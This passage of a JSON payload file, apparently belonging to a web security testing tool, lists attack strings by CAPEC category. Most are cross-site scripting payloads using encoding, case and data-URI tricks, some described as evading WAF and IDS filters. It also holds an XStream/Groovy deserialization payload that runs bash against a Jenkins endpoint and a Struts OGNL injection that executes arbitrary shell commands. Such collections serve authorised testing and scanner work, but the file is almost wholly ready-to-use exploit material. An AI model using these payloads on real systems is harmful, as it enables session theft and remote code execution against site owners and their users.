            "payload_id": "Capec-XSS-243-001",
            "payload_data": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">"
        },
        {
            "capec_id": "243",
            "capec_description": "XSS Targeting HTML Attributes",
            "payload_id": "Capec-XSS-243-001",
            "payload_data": "<BODY ONLOAD=alert('XSS')>"
        },
        {
            "capec_id": "244",
            "capec_description": "XSS Targeting URI Placeholders",
            "payload_id": "Capec-XSS-244-001",
            "payload_data": "<img src=\"data:image/gif;base64,R0lGODdhMAAwAPAAAAAAAP///ywAAAAAMAAwAAAC8IyPqcvt3wCcDkiLc7C0qwyGHhSWpjQu5yqmCYsapyuvUUlvONmOZtfzgFzByTB10QgxOR0TqBQejhRNzOfkVJ5YiUqrXF5Y5lKh/DeuNcP5yLWGsEbtLiOSpa/TPg7JpJHxyendzWTBfX0cxOnKPjgBzi4diinWGdkF8kjdfnycQZXZeYGejmJlZeGl9i2icVqaNVailT6F5iJ90m6mvuTS4OK05M0vDk0Q4XUtwvKOzrcd3iq9uisF81M1OIcR7lEewwcLp7tuNNkM3uNna3F2JQFo97Vriy/Xl4/f1cf5VWzXyym7PHhhx4dbgYKAAA7\">"
        },
        {
            "capec_id": "244",
            "capec_description": "XSS Targeting URI Placeholders",
            "payload_id": "Capec-XSS-244-001",
            "payload_data": "<a href=\"\"onmouseover='prompt(961413)'bad=\">\">"
        },
        {
            "capec_id": "244",
            "capec_description": "XSS Targeting URI Placeholders",
            "payload_id": "Capec-XSS-244-001",
            "payload_data": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\"></object>"
        },
        {
            "capec_id": "245",
            "capec_description": "XSS Using Doubled Characters",
            "payload_id": "Capec-XSS-245-001",
            "payload_data": "<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert``\"';>"
        },
        {
            "capec_id": "245",
            "capec_description": "XSS Using Doubled Characters",
            "payload_id": "Capec-XSS-245-001",
            "payload_data": "<x>%00%00%00%00%00%00%00<script>alert(1)</script>"
        },
        {
            "capec_id": "245",
            "capec_description": "XSS Using Doubled Characters",
            "payload_id": "Capec-XSS-245-001",
            "payload_data": "<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert``\"';>"
        },
        {
            "capec_id": "247",
            "capec_description": "XSS Using Invalid Characters",
            "payload_id": "Capec-XSS-247-001",
            "payload_data": "Payload with CRLF\r\n<a\r\n href=\"\r\nj\r\na\r\nv\r\na\r\ns\r\nc\r\nr\r\ni\r\np\r\nt\r\n:\r\na\r\nl\r\ne\r\nr\r\nt\r\n(\r\n1\r\n2\r\n3\r\n)\r\n\"\r\n>\r\nC\r\nl\r\ni\r\nc\r\nk"
        },
        {
            "capec_id": "247",
            "capec_description": "XSS Using Invalid Characters",
            "payload_id": "Capec-XSS-247-001",
            "payload_data": "<img src='1' o\\x00nerr\\x00or=alert(0) />"
        },
        {
            "capec_id": "247",
            "capec_description": "XSS Using Invalid Characters",
            "payload_id": "Capec-XSS-247-001",
            "payload_data": "<script>al%00ert(1)</script>"
        },
        {
            "capec_id": "500",
            "capec_description": "WebView Injection",
            "payload_id": "Capec-XSS-500-001",
            "payload_data": "<script>alert(document.cookie)</script>"
        },
        {
            "capec_id": "587",
            "capec_description": "Cross Frame Scripting (XFS)",
            "payload_id": "Capec-XSS-587-001",
            "payload_data": ">\"<IfRaMe sRc=hTtp://vulnerability-lab.com></IfRaMe> "
        },
        {
            "capec_id": "591",
            "capec_description": "Reflected XSS",
            "payload_id": "Capec-XSS-591-001",
            "payload_data": "javascript:alert(\"hellox worldss\")"
        },
        {
            "capec_id": "591",
            "capec_description": "Reflected XSS",
            "payload_id": "Capec-XSS-591-001",
            "payload_data": "<script>alert(\"hellox worldss\");</script>"
        },
        {
            "capec_id": "592",
            "capec_description": "Stored XSS ",
            "payload_id": "Capec-XSS-592-001",
            "payload_data": "<style><img src=\"</style><img src=x onerror=alert(XSS)//\">"
        },
        {
            "capec_id": "592",
            "capec_description": "Stored XSS ",
            "payload_id": "Capec-XSS-592-001",
            "payload_data": "<svg xmlns=\"http://www.w3.org/2000/svg\">LOL<script>alert(123)</script></svg>"
        },
        {
            "capec_id": "v1",
            "capec_description": "HTML Tricks of writing the image src query, Payload obsfuscation ",
            "payload_id": "Virsec-XSS-v1-001",
            "payload_data": "<img src=x:alert(alt) onerror=eval(src) alt=0> "
        },
        {
            "capec_id": "v2",
            "capec_description": "Fetching the content from different source with undotted integer format of IP address",
            "payload_id": "Virsec-XSS-v2-001",
            "payload_data": "<script src=//3334957647/1>"
        },
        {
            "capec_id": "v3",
            "capec_description": "SVG self closing tag with different type cases  and without spaces in it. ",
            "payload_id": "Virsec-XSS-v3-001",
            "payload_data": "<sVg/oNCliCK=alert(1)>"
        },
        {
            "capec_id": "v4",
            "capec_description": "HTML entity encoding, with random tags which promts to input box",
            "payload_id": "Virsec-XSS-v4-001",
            "payload_data": "<adam&#32;hr&#00;ef&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</adam"
        },
        {
            "capec_id": "v5",
            "capec_description": "The <VIDEO> element fires an \"onloadstart\" event without user interaction, even if no actual value for the \"src\" attribute is given. This can be used to bypass WAF and IDS systems as this combination of tag and attributes is rather uncommon and unknown.",
            "payload_id": "Virsec-XSS-v5-001",
            "payload_data": "<video src onloadstart=\"alert(1)\">"
        },
        {
            "capec_id": "v6",
            "capec_description": "Data URI injection under <META> tag with the base 64 encoding. Base64 encoding is very uncommon in the XSS world",
            "payload_id": "Virsec-XSS-v6-001",
            "payload_data": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">"
        },
        {
            "capec_id": "v7",
            "capec_description": "combination of UTF-8 and HTML entities this could bypass the filters and also lengthy aaa's to confuse the filters",
            "payload_id": "Virsec-XSS-v7-001",
            "payload_data": "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe"
        },
        {
            "capec_id": "v9",
            "capec_description": "Iframe injection without space and also the keyword confirm is obsufcated",
            "payload_id": "Virsec-XSS-v9-001",
            "payload_data": "<iframe/onload=action=/confir/.source+'m';eval(action)(1)> "
        },
        {
            "capec_id": "v10",
            "capec_description": "Img tag with complete HTML entities",
            "payload_id": "Virsec-XSS-v10-001",
            "payload_data": "<img src=\"1\" onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\" />"
        },
        {
            "capec_id": "v11",
            "capec_description": "a href tag with combintaion of UTF-8 and HTML entities",
            "payload_id": "Virsec-XSS-v11-001",
            "payload_data": "<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a"
        },
        {
            "capec_id": "v12",
            "capec_description": "iframe with data uri injection base 64 data encoded",
            "payload_id": "Virsec-XSS-v12-001",
            "payload_data": "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">"
        },
        {
            "capec_id": "v14",
            "capec_description": "HTML 5 form based injection",
            "payload_id": "Virsec-XSS-v14-001",
            "payload_data": "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(123)\">TESTHTML5FORMACTION"
        },
        {
            "capec_id": "v15",
            "capec_description": "Object tag with data URI uses base 64 encoding",
            "payload_id": "Virsec-XSS-v15-001",
            "payload_data": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>\r\n"
        },
        {
            "capec_id": "v16",
            "capec_description": "embed tag with data URI uses base 64",
            "payload_id": "Virsec-XSS-v16-001",
            "payload_data": "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></embed>"
        },
        {
            "capec_id": "v17",
            "capec_description": "XSS without event handlers",
            "payload_id": "Virsec-XSS-v17-001",
            "payload_data": "<math><brute xlink:href=javascript:alert(1)>click"
        }
    ],
    "capec_a7_stored_xss": [
        {
            "capec_id": "18",
            "capec_description": "XSS Targeting Non-Script Elements",
            "payload_id": "Capec-XSS-18-001",
            "payload_data": "<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>"
        },
        {
            "capec_id": "18",
            "capec_description": "XSS Targeting Non-Script Elements",
            "payload_id": "Capec-XSS-18-001",
            "payload_data": "<name>\r\n  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>\r\n</name>"
        },
        {
            "capec_id": "19",
            "capec_description": "Embedding Scripts within Scripts",
            "payload_id": "Capec-XSS-19-001",
            "payload_data": "<IMG SRC=javascript:alert('XSS')>"
        },
        {
            "capec_id": "32",
            "capec_description": "XSS Through HTTP Query Strings",
            "payload_id": "Capec-XSS-32-001",
            "payload_data": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
        },
        {
            "capec_id": "32",
            "capec_description": "XSS Through HTTP Query Strings",
            "payload_id": "Capec-XSS-32-001",
            "payload_data": "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"
        },
        {
            "capec_id": "43",
            "capec_description": "Exploiting Multiple Input Interpretation Layers ",
            "payload_id": "Capec-XSS-43-001",
            "payload_data": "<script>alert('hacked');</script>>"
        },
        {
            "capec_id": "63",
            "capec_description": "Cross-Site Scripting (XSS)",
            "payload_id": "Capec-XSS-63-001",
            "payload_data": "<script>throw~delete~typeof~prompt(1)</script>"
        },
        {
            "capec_id": "63",
            "capec_description": "Cross-Site Scripting (XSS)",
            "payload_id": "Capec-XSS-63-001",
            "payload_data": "<SCRIPT>document.write(\"XSS\");</SCRIPT>"
        },
        {
            "capec_id": "86",
            "capec_description": "XSS Through HTTP Headers",
            "payload_id": "Capec-XSS-86-001",
            "payload_data": "<iframe src=\"http://www.victim.com/?v=<script>if\">"
        },
        {
            "capec_id": "86",
            "capec_description": "XSS Through HTTP Headers",
            "payload_id": "Capec-XSS-86-001",
            "payload_data": "http://www.google<script .com>alert(document.location)</script"
        },
        {
            "capec_id": "86",
            "capec_description": "XSS Through HTTP Headers",
            "payload_id": "Capec-XSS-86-001",
            "payload_data": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">test</a>"
        },
        {
            "capec_id": "198",
            "capec_description": "XSS Targeting Error Pages",
            "payload_id": "Capec-XSS-198-001",
            "payload_data": "%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A"
        },
        {
            "capec_id": "198",
            "capec_description": "XSS Targeting Error Pages",
            "payload_id": "Capec-XSS-198-001",
            "payload_data": "<img src='1' onerror\\x00=alert(0) />"
        },
        {
            "capec_id": "198",
            "capec_description": "XSS Targeting Error Pages",
            "payload_id": "Capec-XSS-198-001",
            "payload_data": "<img src='1' o\\x00nerr\\x00or=alert(0) />"
        },
        {
            "capec_id": "199",
            "capec_description": "XSS Using Alternate Syntax",
            "payload_id": "Capec-XSS-199-001",
            "payload_data": "<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>"
        },
        {
            "capec_id": "199",
            "capec_description": "XSS Using Alternate Syntax",
            "payload_id": "Capec-XSS-199-001",
            "payload_data": "<iMg SrC=x OnErRoR=window.location=123>"
        },
        {
            "capec_id": "199",
            "capec_description": "XSS Using Alternate Syntax",
            "payload_id": "Capec-XSS-199-001",
            "payload_data": "<INPUT TYPE=\"IMAGE\" id=XSS SRC=\"javascript:alert('XSS');\">"
        },
        {
            "capec_id": "209",
            "capec_description": "XSS Using MIME Type Mismatch",
            "payload_id": "Capec-XSS-209-001",
            "payload_data": "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
        },
        {
            "capec_id": "243",
            "capec_description": "XSS Targeting HTML Attributes",
            "payload_id": "Capec-XSS-243-001",
            "payload_data": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">"
        },
        {
            "capec_id": "243",
            "capec_description": "XSS Targeting HTML Attributes",
            "payload_id": "Capec-XSS-243-001",
            "payload_data": "<BODY ONLOAD=alert('XSS')>"
        },
        {
            "capec_id": "244",
            "capec_description": "XSS Targeting URI Placeholders",
            "payload_id": "Capec-XSS-244-001",
            "payload_data": "<img src=\"data:image/gif;base64,R0lGODdhMAAwAPAAAAAAAP///ywAAAAAMAAwAAAC8IyPqcvt3wCcDkiLc7C0qwyGHhSWpjQu5yqmCYsapyuvUUlvONmOZtfzgFzByTB10QgxOR0TqBQejhRNzOfkVJ5YiUqrXF5Y5lKh/DeuNcP5yLWGsEbtLiOSpa/TPg7JpJHxyendzWTBfX0cxOnKPjgBzi4diinWGdkF8kjdfnycQZXZeYGejmJlZeGl9i2icVqaNVailT6F5iJ90m6mvuTS4OK05M0vDk0Q4XUtwvKOzrcd3iq9uisF81M1OIcR7lEewwcLp7tuNNkM3uNna3F2JQFo97Vriy/Xl4/f1cf5VWzXyym7PHhhx4dbgYKAAA7\">"
        },
        {
            "capec_id": "244",
            "capec_description": "XSS Targeting URI Placeholders",
            "payload_id": "Capec-XSS-244-001",
            "payload_data": "<a href=\"\"onmouseover='prompt(961413)'bad=\">\">"
        },
        {
            "capec_id": "244",
            "capec_description": "XSS Targeting URI Placeholders",
            "payload_id": "Capec-XSS-244-001",
            "payload_data": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\"></object>"
        },
        {
            "capec_id": "245",
            "capec_description": "XSS Using Doubled Characters",
            "payload_id": "Capec-XSS-245-001",
            "payload_data": "<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert``\"';>"
        },
        {
            "capec_id": "245",
            "capec_description": "XSS Using Doubled Characters",
            "payload_id": "Capec-XSS-245-001",
            "payload_data": "<x>%00%00%00%00%00%00%00<script>alert(1)</script>"
        },
        {
            "capec_id": "245",
            "capec_description": "XSS Using Doubled Characters",
            "payload_id": "Capec-XSS-245-001",
            "payload_data": "<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert``\"';>"
        },
        {
            "capec_id": "247",
            "capec_description": "XSS Using Invalid Characters",
            "payload_id": "Capec-XSS-247-001",
            "payload_data": "Payload with CRLF\r\n<a\r\n href=\"\r\nj\r\na\r\nv\r\na\r\ns\r\nc\r\nr\r\ni\r\np\r\nt\r\n:\r\na\r\nl\r\ne\r\nr\r\nt\r\n(\r\n1\r\n2\r\n3\r\n)\r\n\"\r\n>\r\nC\r\nl\r\ni\r\nc\r\nk"
        },
        {
            "capec_id": "247",
            "capec_description": "XSS Using Invalid Characters",
            "payload_id": "Capec-XSS-247-001",
            "payload_data": "<img src='1' o\\x00nerr\\x00or=alert(0) />"
        },
        {
            "capec_id": "247",
            "capec_description": "XSS Using Invalid Characters",
            "payload_id": "Capec-XSS-247-001",
            "payload_data": "<script>al%00ert(1)</script>"
        },
        {
            "capec_id": "500",
            "capec_description": "WebView Injection",
            "payload_id": "Capec-XSS-500-001",
            "payload_data": "<script>alert(document.cookie)</script>"
        },
        {
            "capec_id": "587",
            "capec_description": "Cross Frame Scripting (XFS)",
            "payload_id": "Capec-XSS-587-001",
            "payload_data": ">\"<IfRaMe sRc=hTtp://vulnerability-lab.com></IfRaMe> "
        },
        {
            "capec_id": "591",
            "capec_description": "Reflected XSS",
            "payload_id": "Capec-XSS-591-001",
            "payload_data": "javascript:alert(\"hellox worldss\")"
        },
        {
            "capec_id": "591",
            "capec_description": "Reflected XSS",
            "payload_id": "Capec-XSS-591-001",
            "payload_data": "<script>alert(\"hellox worldss\");</script>"
        },
        {
            "capec_id": "592",
            "capec_description": "Stored XSS ",
            "payload_id": "Capec-XSS-592-001",
            "payload_data": "<style><img src=\"</style><img src=x onerror=alert(XSS)//\">"
        },
        {
            "capec_id": "592",
            "capec_description": "Stored XSS ",
            "payload_id": "Capec-XSS-592-001",
            "payload_data": "<svg xmlns=\"http://www.w3.org/2000/svg\">LOL<script>alert(123)</script></svg>"
        },
        {
            "capec_id": "v1",
            "capec_description": "HTML Tricks of writing the image src query, Payload obsfuscation ",
            "payload_id": "Virsec-XSS-v1-001",
            "payload_data": "<img src=x:alert(alt) onerror=eval(src) alt=0> "
        },
        {
            "capec_id": "v2",
            "capec_description": "Fetching the content from different source with undotted integer format of IP address",
            "payload_id": "Virsec-XSS-v2-001",
            "payload_data": "<script src=//3334957647/1>"
        },
        {
            "capec_id": "v3",
            "capec_description": "SVG self closing tag with different type cases  and without spaces in it. ",
            "payload_id": "Virsec-XSS-v3-001",
            "payload_data": "<sVg/oNCliCK=alert(1)>"
        },
        {
            "capec_id": "v4",
            "capec_description": "HTML entity encoding, with random tags which promts to input box",
            "payload_id": "Virsec-XSS-v4-001",
            "payload_data": "<adam&#32;hr&#00;ef&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</adam"
        },
        {
            "capec_id": "v5",
            "capec_description": "The <VIDEO> element fires an \"onloadstart\" event without user interaction, even if no actual value for the \"src\" attribute is given. This can be used to bypass WAF and IDS systems as this combination of tag and attributes is rather uncommon and unknown.",
            "payload_id": "Virsec-XSS-v5-001",
            "payload_data": "<video src onloadstart=\"alert(1)\">"
        },
        {
            "capec_id": "v6",
            "capec_description": "Data URI injection under <META> tag with the base 64 encoding. Base64 encoding is very uncommon in the XSS world",
            "payload_id": "Virsec-XSS-v6-001",
            "payload_data": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">"
        },
        {
            "capec_id": "v7",
            "capec_description": "combination of UTF-8 and HTML entities this could bypass the filters and also lengthy aaa's to confuse the filters",
            "payload_id": "Virsec-XSS-v7-001",
            "payload_data": "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe"
        },
        {
            "capec_id": "v9",
            "capec_description": "Iframe injection without space and also the keyword confirm is obsufcated",
            "payload_id": "Virsec-XSS-v9-001",
            "payload_data": "<iframe/onload=action=/confir/.source+'m';eval(action)(1)> "
        },
        {
            "capec_id": "v10",
            "capec_description": "Img tag with complete HTML entities",
            "payload_id": "Virsec-XSS-v10-001",
            "payload_data": "<img src=\"1\" onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\" />"
        },
        {
            "capec_id": "v11",
            "capec_description": "a href tag with combintaion of UTF-8 and HTML entities",
            "payload_id": "Virsec-XSS-v11-001",
            "payload_data": "<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a"
        },
        {
            "capec_id": "v12",
            "capec_description": "iframe with data uri injection base 64 data encoded",
            "payload_id": "Virsec-XSS-v12-001",
            "payload_data": "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">"
        },
        {
            "capec_id": "v14",
            "capec_description": "HTML 5 form based injection",
            "payload_id": "Virsec-XSS-v14-001",
            "payload_data": "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(123)\">TESTHTML5FORMACTION"
        },
        {
            "capec_id": "v15",
            "capec_description": "Object tag with data URI uses base 64 encoding",
            "payload_id": "Virsec-XSS-v15-001",
            "payload_data": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>\r\n"
        },
        {
            "capec_id": "v16",
            "capec_description": "embed tag with data URI uses base 64",
            "payload_id": "Virsec-XSS-v16-001",
            "payload_data": "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></embed>"
        },
        {
            "capec_id": "v17",
            "capec_description": "XSS without event handlers",
            "payload_id": "Virsec-XSS-v17-001",
            "payload_data": "<math><brute xlink:href=javascript:alert(1)>click"
        }
    ],
    "capec_a8": [
        {
            "capec_id": "",
            "capec_description": "",
            "payload_id": "Capec-A8-NA-001",
            "payload_data": "<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\x0d\\x0a<map>\\x0d\\x0a  <entry>\\x0d\\x0a    <groovy.util.Expando>\\x0d\\x0a      <expandoProperties>\\x0d\\x0a        <entry>\\x0d\\x0a          <string>hashCode</string>\\x0d\\x0a          <org.codehaus.groovy.runtime.MethodClosure>\\x0d\\x0a            <delegate class=\\\"groovy.util.Expando\\\"/>\\x0d\\x0a            <owner class=\\\"java.lang.ProcessBuilder\\\">\\x0d\\x0a              <command>\\x0d\\x0a                <string>bash</string><string>-c</string><string>ifconfig</string>\\x0d\\x0a              </command>\\x0d\\x0a            </owner>\\x0d\\x0a            <method>start</method>\\x0d\\x0a          </org.codehaus.groovy.runtime.MethodClosure>\\x0d\\x0a        </entry>\\x0d\\x0a      </expandoProperties>\\x0d\\x0a    </groovy.util.Expando>\\x0d\\x0a    <int>1</int>\\x0d\\x0a  </entry>\\x0d\\x0a</map>'     $'http://'$IP:$PORT/jenkins/createItem?name=random1 >"
        }
    ],
    "capec_a9": [
        {
            "capec_id": "V1",
            "capec_description": "",
            "payload_id": "Capec-A9-V1-001",
            "payload_data": "${(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='{}').\".format(cmd)(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        }
    ],
    "capec_a10": [
        {
            "capec_id": "",
            "capec_description": "",
            "payload_id": "",
            "payload_data": ""
        }
    ]
}